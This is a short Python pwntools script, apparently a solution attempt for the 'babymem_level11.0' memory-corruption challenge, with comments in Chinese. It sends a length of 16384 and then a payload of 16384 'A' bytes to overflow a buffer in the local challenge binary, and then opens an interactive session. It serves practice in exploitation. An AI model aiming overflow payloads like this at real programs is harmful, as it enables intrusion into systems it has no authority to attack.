#!/usr/bin/env python3
from pwn import *

# 为目标架构设置上下文
context.arch = 'amd64'

# 启动进程
p = process('/challenge/babymem_level11.0')

# 准备有效载荷
buffer_size = 16384
p.sendline(b'16384')

payload = b'A' * buffer_size

# 发送恶意有效载荷
p.sendline(payload)

# 与进程进行交互，以查看输出或调试
p.interactive()